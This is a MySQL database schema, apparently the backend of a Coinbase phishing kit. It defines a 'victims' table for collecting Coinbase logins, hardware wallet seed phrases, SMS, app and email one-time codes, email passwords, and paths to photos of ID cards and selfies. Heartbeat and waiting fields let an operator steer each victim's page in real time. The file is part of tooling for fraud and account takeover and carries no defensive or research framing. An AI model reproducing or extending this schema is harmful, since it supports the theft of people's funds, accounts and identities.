SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";

CREATE TABLE `victims` (
  -- Identifier
  `id` bigint(20) UNSIGNED NOT NULL,

  -- Browser information
  `ip_address` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_agent` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,

  -- Live information
  `heartbeat` int(128) NOT NULL, -- The value of the page to update to
  `is_waiting` tinyint(1) NOT NULL DEFAULT 0, -- On the loading page

  -- Login information
  `username` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Coinbase email
  `password` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Coinbase password
  `last2` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Last 2 digits of phone (sms payloads)
  `first1` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- First digit of phone (yahoo payload)

  -- Hardware wallet
  `seed` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Hardware wallet seed

  -- OTPs
  `app_otp` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Application otp code
  `sms_otp` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Phone otp code
  `url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- URL for new devices

  -- Email information
  `email_password` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Email page password
  `email_otp` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Email page otp code
  `email_app` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Email page otp code

  -- ID information
  `idfront` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Front id path
  `idback` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Back id path
  `selfie` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL, -- Selfie path

  -- Date information
  `seen_at` int(128) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

ALTER TABLE `victims`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `victims`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

COMMIT;